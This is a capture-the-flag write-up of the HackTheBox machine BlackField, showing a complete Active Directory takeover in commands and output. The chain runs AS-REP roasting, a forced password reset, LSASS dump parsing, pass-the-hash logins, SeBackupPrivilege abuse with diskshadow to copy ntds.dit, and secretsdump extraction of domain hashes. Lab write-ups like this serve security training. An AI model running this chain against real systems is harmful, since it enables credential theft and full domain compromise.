---
layout: post
title: BlackField - HackTheBox
date: 2024-08-17
category: CTF
tags:
  - HackTheBox
  - Active Directory
  - SeBackupPrivilege
platform: HackTheBox
cover_image: /assets/blackfield2.png
post_type: writeup
---

# BlackField - HackTheBox

**Description:** Writeup for the BlackField machine on HackTheBox, covering Active Directory enumeration, AS-REP roasting, BloodHound analysis, LSASS dump extraction, SeBackupPrivilege abuse, and NTDS.dit dumping for full domain compromise.

---

# Short Summary

After quick enumeration, we can find a list of usernames inside of the SMB share, followed by AS-REP-roasting, in order to gain the credentials of **support** account. We move over to Bloodhound enumeration, and we find the interesting ForceChangePassword capability, what leads to finding `lssas.DMP`. Dumping hashes enables us to connect over WinRM protocol, what reveals the SeBackupPrivilege and SeRestorePrivilege enabled privileges, and these can be very useful in order to read and save variants of SAM and SYSTEM files, followed by `ntds.dit` . From there we can just pass the hash with evil-winrm and simply get access as administrator.

# Walkthrough

We start with scanning all of the ports, which gives us a classic  Windows Domain controller, and we are able to obtain the domain name: `blackfield.local`.

```bash
└─$ sudo nmap -T4 -A -p- 10.10.10.192
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-17 20:47 CEST
Nmap scan report for BLACKFIELD.local (10.10.10.192)
Host is up (0.052s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-08-18 01:49:04Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (88%)
Aggressive OS guesses: Microsoft Windows Server 2019 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-08-18T01:49:14
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 7h00m01s

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   51.85 ms 10.10.14.1
2   48.26 ms BLACKFIELD.local (10.10.10.192)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 152.16 seconds
```

Additionally, we see that the SMB and WinRM are open, which gives us a good enumeration and attack surface. Let's check it out.

!!! note
    We start with quick run of `enum4linux` that gives us information that we are allowed to start sessions with an empty username and password.

```bash
└─$ enum4linux -U 10.10.10.192                                                  
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Aug 17 21:08:01 2024

 =========================================( Target Information )=========================================
                                                                                                                                     
Target ........... 10.10.10.192                                                                                                      
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

 ============================( Enumerating Workgroup/Domain on 10.10.10.192 )============================                                                                                                                              
                                                                                                                                     
[E] Can't find workgroup/domain                                                                                                                                                                                                                                        
                                                                                                                                    
 ===================================( Session Check on 10.10.10.192 )===================================                                                                                                                       
                                                                                                                                     
[+] Server 10.10.10.192 allows sessions using username '', password ''                                                               
                                                                                                                                                                                                                                                                  
 ================================( Getting domain SID for 10.10.10.192 )================================
                                                                                                                                     
Domain Name: BLACKFIELD                                                                                                              
Domain Sid: S-1-5-21-4194615774-2175524697-3563712290

[+] Host is part of a domain (not a workgroup)  

.....
```

## SMB Enumeration and Discovery of Usernames

As discovered, we will try to list shares at first, and then proceed to experiment with null sessions. Useful resource would be [https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html](https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html), that contains the cheat sheet of SMB enumeration, with detailed commands and flags.

```bash
└─$ smbclient -L \\10.10.10.192 -N       

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        forensic        Disk      Forensic / Audit share.
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        profiles$       Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.192 failed (Error NT_STATUS_IO_TIMEOUT)
Unable to connect with SMB1 -- no workgroup available
```

From here, `forensic` and `profiles$` seem to be interesting. So, we check out `forensic` share first, but soon we see that it indeed requires privileges, therefore, we try enumerating `profiles$` .

```bash
└─$ smbclient \\\\10.10.10.192\\profiles$
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Jun  3 18:47:12 2020
  ..                                  D        0  Wed Jun  3 18:47:12 2020
  AAlleni                             D        0  Wed Jun  3 18:47:11 2020
  ABarteski                           D        0  Wed Jun  3 18:47:11 2020
  ABekesz                             D        0  Wed Jun  3 18:47:11 2020
  ABenzies                            D        0  Wed Jun  3 18:47:11 2020
  ABiemiller                          D        0  Wed Jun  3 18:47:11 2020
  AChampken                           D        0  Wed Jun  3 18:47:11 2020
  ACheretei                           D        0  Wed Jun  3 18:47:11 2020
  ACsonaki                            D        0  Wed Jun  3 18:47:11 2020
  AHigchens                           D        0  Wed Jun  3 18:47:11 2020
  AJaquemai                           D        0  Wed Jun  3 18:47:11 2020
  AKlado                              D        0  Wed Jun  3 18:47:11 2020
  AKoffenburger                       D        0  Wed Jun  3 18:47:11 2020
  AKollolli                           D        0  Wed Jun  3 18:47:11 2020
  AKruppe                             D        0  Wed Jun  3 18:47:11 2020
  AKubale                             D        0  Wed Jun  3 18:47:11 2020
  ....
```

## AS-REP Roasting

If we obtain some kind of usernames list in this environment, it would be useful to automatically check for  valid usernames through tool called `kerbrute`, what would potentially also reveal users whose pre-authentication is disabled, what indicates that those accounts are AS-REP roastable!

```bash
└─$ /opt/kerbrute/kerbrute-linux-amd64 userenum --dc 10.10.10.192 -d blackfield.local users.txt            
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 08/17/24 - Ronnie Flathers @ropnop

2024/08/17 23:13:39 >  Using KDC(s):
2024/08/17 23:13:39 >   10.10.10.192:88

2024/08/17 23:14:00 >  [+] VALID USERNAME:       audit2020@blackfield.local
2024/08/17 23:15:53 >  [+] support has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$support@BLACKFIELD.LOCAL:54ed61d05f51f428d8022cb309cddcf0$48cf85f08d1b2a5b0e6b126f26e8f2cd2171be9799bddcef425b05c2b91300dd16da56488235a448f59a833be59870fe1885a2a1e41daacdef1af89fa115bf4f1bafa0eca203903f5112f6426477573aab51fccc957a4c3c85a531a8aa3f8d02b2a5e30245105f3e1210174ca6532001676e18d99db26bce3a6f1e6a90d1be9960bd2be904b26e4225d75cb042dadd0abb852df399594ad1fa1d3c79c1478e6c9dc8aa9053df71c858819a7dd731a4db80571d04d04552837ac04cdac30f2eddde3d35c6591de735fc8db00833f584351fcf982d6782efba6191784970fc6f5b4f9ea166f29899c5e404686d6e0e7da978109fee8958de66de98a8ce97d13ae148bb8c2baf878384                                                                 
2024/08/17 23:15:53 >  [+] VALID USERNAME:       support@blackfield.local
2024/08/17 23:15:57 >  [+] VALID USERNAME:       svc_backup@blackfield.local
2024/08/17 23:16:23 >  Done! Tested 314 usernames (3 valid) in 163.643 seconds
```

Nice, we have obtained the hash that could be cracked using the **John the Ripper** or **Hashcat** (module 18200), but I prefer to launch Impacket's GetNPUsers.py and to specify format hashcat.

```bash
└─$ GetNPUsers.py  blackfield.local/ -dc-ip 10.10.10.192 -usersfile users.txt -format hashcat | grep -v 'Kerberos SessionError:'
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$support@BLACKFIELD.LOCAL:95db7ab9f7fc4baf59995b41dcb786e9$3bed44debc6725422033ff312d1c2c56f554a05714b49fe5455e9d949b36aa817ac6c52c076c10671aea738d88b8040229985506c3193746765dd437dc27b38d262b3a917a7935bf07d5608055186c1f0fb3042fbe1cfa126a293572c47f8098dcb9c09d22419ea6d76ec125b61a73a154de706c9ecebd5291099cd34b0132e6690b1653c12b9ba2b10c2090af2f7949c2a36be523a4c7b593d53232ca7a803a9c3aeb121ed115b8ffe8fe0053f72af390c5e42f65b97b2d0c286249b276cfc2b1ea83766d137ebd35117a84d77efaea945f62837f4775bc391fba37a5e284c57c973b33b16456f555169ed55284ffe3b8f7dd0e
[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
```

We can execute `hashcat -m 18200 -O hash.txt /usr/share/wordlists/rockyou.txt` , where module 18200 is for *Kerberos 5, etype 23, AS-REP,* and it is recommended to do all of the cracking on the host machine,  since CPU-based cracking on VM is generally slower than GPU-based cracking, especially for complex hashes.

![Hashcat cracking result](/assets/blackfield-image.png)

## Initial Foothold and Bloodhound Enumeration

After obtaining credentials of low-privileged user, I've tried checking again for SMB Share access to `forensic` , and also have done check for shell access over port `5985` , but no luck.

```bash
└─$ crackmapexec smb 10.10.10.192 -u 'support' -p '#00^BlackKnight'                       
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight 
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/HTB/blackfield]
└─$ crackmapexec winrm 10.10.10.192 -u 'support' -p '#00^BlackKnight'
SMB         10.10.10.192    5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
HTTP        10.10.10.192    5985   DC01             [*] http://10.10.10.192:5985/wsman
HTTP        10.10.10.192    5985   DC01             [-] BLACKFIELD.local\support:#00^BlackKnight 
```

It is time to fire up neo4j console, bloodhound GUI and to ingest data using `bloodhound-python`.

!!! note
    After uploading data, all of the JSON files, we can search for our targeted user, **SUPPORT@BLACKFIELD.LOCAL**, and look at `Node Info` from there. There are many things to look at, such as SPN(Service Principal Names), Admin Logons to non-Domain Controllers and so on, but in this case First Degree Object Control, reveals that we are capable of changing AUDIT2020@BLACKFIELD.LOCAL's password without knowing that user's current password.

![BloodHound ForceChangePassword](/assets/blackfield-image1.png)

## ForceChangePassword

With a quick Google search, we can out that rpcclient can be utilized to change a password of `audit2020` , so we can run the following. (Reference: [https://www.thehacker.recipes/a-d/movement/dacl/forcechangepassword](https://www.thehacker.recipes/a-d/movement/dacl/forcechangepassword) )

```bash
└─$ rpcclient 10.10.10.192 -U "support"
Password for [WORKGROUP\support]:
rpcclient $> setuserinfo2 audit2020 23 faris123.
rpcclient $> 
```

Now lets check again for available options for `audit2020` . We utilize again crackmapexec checks, but still no luck...

```bash
└─$ crackmapexec smb 10.10.10.192 -u 'audit2020' -p 'faris123.'      
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\audit2020:faris123. 
                                                                                                       
┌──(kali㉿kali)-[~/HTB/blackfield]
└─$ crackmapexec winrm 10.10.10.192 -u 'audit2020' -p 'faris123.'
SMB         10.10.10.192    5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
HTTP        10.10.10.192    5985   DC01             [*] http://10.10.10.192:5985/wsman
HTTP        10.10.10.192    5985   DC01             [-] BLACKFIELD.local\audit2020:faris123.
```

The interesting thing that pops to us is the availability of SMB Share `forensic` , so we list it out.

```bash
└─$ smbclient \\\\10.10.10.192\\forensic -U audit2020
Password for [WORKGROUP\audit2020]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Feb 23 14:03:16 2020
  ..                                  D        0  Sun Feb 23 14:03:16 2020
  commands_output                     D        0  Sun Feb 23 19:14:37 2020
  memory_analysis                     D        0  Thu May 28 22:28:33 2020
  tools                               D        0  Sun Feb 23 14:39:08 2020

                5102079 blocks of size 4096. 1662505 blocks available
smb: \> 
```

## lsass.DMP Jackpot

Since I went to a rabbit hole on this part, I'll go straight to the point and reveal that there is `lsass.zip` available, that contains `lsass.DMP` .

![lsass.DMP discovery](/assets/blackfield-image2.png)

!!! note
    Reference: https://technicalnavigator.in/how-to-extract-information-from-dmp-files/

We can utilize the tool called pypykatz, which tends to be a similar implementation of popular mimikatz, and this helped us to move further. Nevertheless, we should always go for quick wins like  dumping the hashes in the domain with a DCSync, but unfortunately, no luck...

Account that turned out to be our next link in the attack chain is `svc_backup` .

```bash
└─$ pypykatz lsa minidump lsass.DMP
INFO:pypykatz:Parsing file lsass.DMP
FILE: ======== lsass.DMP =======
== LogonSession ==
authentication_id 406458 (633ba)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406458
        == MSV ==
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
                DPAPI: a03cd8e9d30171f3cfe8caad92fef62100000000
        == WDIGEST [633ba]==
                username svc_backup
                domainname BLACKFIELD
                password None
                password (hex)
        == Kerberos ==
                Username: svc_backup
                Domain: BLACKFIELD.LOCAL
        == WDIGEST [633ba]==
                username svc_backup
                domainname BLACKFIELD
                password None
                password (hex)
```

One important lesson I've learned is to utilize Pass-the-Hash attacks when attempting to obtain shells, rather than exhaustively striving to crack hashes when it isn't necessary.

```bash
└─$ crackmapexec winrm 10.10.10.192 -u 'svc_backup' -H 9658d1d1dcd9250115e2205d9f48400d
SMB         10.10.10.192    5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
HTTP        10.10.10.192    5985   DC01             [*] http://10.10.10.192:5985/wsman
HTTP        10.10.10.192    5985   DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d (Pwn3d!)
```

It turns out that we are able to connect using the `svc_backup` and its shell, so lets try that first.

```bash
└─$ evil-winrm -i 10.10.10.192 -u 'svc_backup' -H 9658d1d1dcd9250115e2205d9f48400d
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                   
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                     
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami
blackfield\svc_backup
```

## Vertical privilege escalation

There are many ways to perform the enumeration once we have a low-privileged shell, such as winpeas, PowerUp and so on. For purposes of this writeup, I will go with a manual way.

```bash
*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

SeBackupPrivilege is what are we going to focus on, since it allows users to create backup copies on the system. That means that the user could potentially have a full read access to the file system -> sensitive files such as SAM or SYSTEM Registry File are exposed.

```bash
*Evil-WinRM* PS C:\Users\svc_backup\Documents> cd c:\windows\temp
*Evil-WinRM* PS C:\windows\temp> reg save hklm\sam c:\windows\temp\sam
The operation completed successfully.

*Evil-WinRM* PS C:\windows\temp> reg save hklm\system c:\windows\temp\system
The operation completed successfully.
```

## Dumping the NTDS.dit

I have done again a quick Google search and kudos to Hacking Articles (reference: [https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/) ) for showing this exploit.

The main problem here with dumping the NTDS.dit is that the target machine is running, what indicates that the file is always in usage, furthermore we cannot copy the file using any conventional methods. What can do, is to create a Distributed Shell File, which is going to trigger the diskshadow to create a copy of C: Drive with our own alias.

```bash
└─$ cat faris.dsh                                                                                    
set context persistent nowriters
add volume c: alias faris
create
expose %faris% z:-
```

On targets machine we upload and trigger the `faris.dsh` file:

```bash
*Evil-WinRM* PS C:\windows\temp> diskshadow /s faris.dsh
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  8/17/2024 11:10:09 PM

-> set context persistent nowriters
-> add volume c: alias faris
-> create
Alias faris for shadow ID {43bf6392-dc24-4a43-aa53-81c0da3447ac} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {45fca1d1-3d1a-4481-bd05-7a0b4e37b648} set as environment variable.

Querying all shadow copies with the shadow copy set ID {45fca1d1-3d1a-4481-bd05-7a0b4e37b648}

        * Shadow copy ID = {43bf6392-dc24-4a43-aa53-81c0da3447ac}               %faris%
                - Shadow copy set: {45fca1d1-3d1a-4481-bd05-7a0b4e37b648}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 8/17/2024 11:10:11 PM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %faris% z:
-> %faris% = {43bf6392-dc24-4a43-aa53-81c0da3447ac}
The  drive letter is already in use.
```

```bash
*Evil-WinRM* PS C:\windows\temp> robocopy /b z:\windows\ntds . ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Saturday, August 17, 2024 11:11:36 PM
   Source : z:\windows\ntds\
     Dest : C:\windows\temp\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

                           1    z:\windows\ntds\
            New File              18.0 m        ntds.dit
  0.0%
  0.3%
  0.6%
  1.0%
  ...
```

We can proceed to get the missing part of the puzzle and download the `ntds.dit` .

## secretsdump.py to Dump All of the Hashes in the Domain

There is no need to downlod system hive file again from the temp directory, we can just execute the `secretsdump.py` and fire up pass-the-hash attack with newly obtained Administrator hash.

```bash
└─$ secretsdump.py -ntds ntds.dit -system system LOCAL    
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:f8b1d273c32b63d4bedc95f360b47f97:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
BLACKFIELD.local\BLACKFIELD764430:1105:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD538365:1106:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
...
```

We utilize the port that is opened on 5985 once again, and it seems like we can "cat out" the root flag successfully!!

```bash
└─$ evil-winrm -i 10.10.10.192 -u administrator -H 184fb5e5178480be64824d4cd53b99ee 
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                       
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                         
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
blackfield\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd c:\users\administrator\desktop
*Evil-WinRM* PS C:\users\administrator\desktop> type root.txt
4375****************************
```
